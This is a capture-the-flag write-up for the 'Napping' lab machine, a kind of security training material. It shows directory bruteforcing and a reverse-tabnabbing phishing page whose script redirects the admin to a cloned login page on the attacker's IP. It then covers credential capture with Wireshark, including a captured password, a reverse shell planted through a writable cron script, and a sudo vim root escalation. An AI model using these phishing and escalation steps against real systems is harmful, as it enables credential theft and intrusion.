---

title: "Napping"

---

<center>
<strong>1. 🔍 Enumeration Part + Directory Bruteforcing</strong><br> 
<strong>2. ☠️ Exploitation Part</strong><br>
<strong>3. 🔓 Privilege Escalation Part</strong>
</center>

---

<h2><span style="color:red">1. 🔍 Enumeration Part + Directory Bruteforcing</span></h2><br>
We will start from the nmap scan:
<center>
<img src="./images/napping/nmap_napping.png"> 
</center><br>

Directory bruteforcing using gobuster tool:<br>
```bash
gobuster dir -u http://10.10.136.217/ -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
```
<center>
<img src="./images/napping/gobuster_napping.png">
</center><br>

We also see that /admin directory appeared, going further to see more:<br>
```bash
gobuster dir -u http://10.10.136.217/admin/ -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
```

<center>
<img src="./images/napping/gobuster_admin_napping.png"> 
</center><br>

Cheking the main page:<br>
<center>
<img src="./images/napping/mainpage_napping.png">
</center>

We will sign up a new account<br>
<center>
<img src="./images/napping/sign_up_napping.png">
</center><br>

Also checking the admin page on /admin/login.php<br>
<center>
<img src="./images/napping/admin_login_napping.png">
</center><br>

After creating and signing up as a hacker, we see the text that says "Please submit your link so that we can get started.
All links will be reviewed by our admin who also built this site!"<br>
<center>
<img src="./images/napping/loggedin_napping.png">
</center>
<br>

By cloning the /admin/login.php page and creating a phishing HTML page with credential capture functionality, we can attempt to trick the admin into entering their credentials when they review our submitted link.<br>

<h2><span style="color:red"><strong>2. ☠️ Exploitation Part</strong></span></h2><br>

Let's get our /admin/login.php page:<br>
<center>
<img src="./images/napping/wget_login_php_napping.png">
</center><br>

And create test.html document for our phishing part:<br>
```bash
<!DOCTYPE html>
<html>
   <body>
      <script>
         window.opener.location='http://10.11.147.142:8000/login.php';
      </script>
   </body>
</html>
```
NOTE: You write your IP from the attacker mashine and store both (login.php and test.html) files at the same directory.<br>

From the files directory we run a python server on port 80 and 8000.<br>
<center>
<img src="./images/napping/python3_napping.png">
</center>
<br>

Starting WIRESHARK for our phishing process:<br>
<center>
<img src="./images/napping/wireshark_start_napping.png">
</center>
NOTE: start capturing traffic before u send a link to the target, and by your openvpn interface (I have tun0).
<br>

Sending our phishing link and straight ahead switching to WIRESHARK:<br>
```bash
http://your.ip:80/test.html
```
<br>
<center>
<img src="./images/napping/submit_napping.png">
</center><br>

By following tcp traffic we can see captured creds:<br>
<center>
<img src="./images/napping/creds_wireshark_napping.png">
</center><br>
NOTE: Password is URL encoded. Decoding it you've got C@ughtm3napping123

<br>
Using captured credentials for SSH login in.<br>
<center>
<img src="./images/napping/ssh_login_daniel_napping.png">
</center><br>

We are in!!!<br>
<center>
<img src="./images/napping/query_py_napping.png">
</center><br>

<h2><span style="color:red">3. 🔓 Privilege Escalation Part</span></h2><br>

After some time of investigation we can find Adrian user and a file query.py,<br>
this script runs by it's user every 1 minute.<br>
Also we can read and write it, lets use it to get an Adrian's shell.<br>
<center>
<img src="./images/napping/revshesll_napping.png">
</center><br>
NOTE: your IP will be different.<br>

Open netcat listener, and we wait untill script will be executed.<br>
<center>
<img src="./images/napping/adrian_napping.png">
</center><br>
Direct command sudo -l shows us we can run vim as a sudo user.<br>
Lets get root!!!<br>
<center>
Checking GTFObins<br>
<img src="./images/napping/gtfo_napping.png">
</center><br>

Writing the command with sudo will give us root:<br>
<center>
<img src="./images/napping/privesc_root_napping.png">
</center><br>
We are root!!!
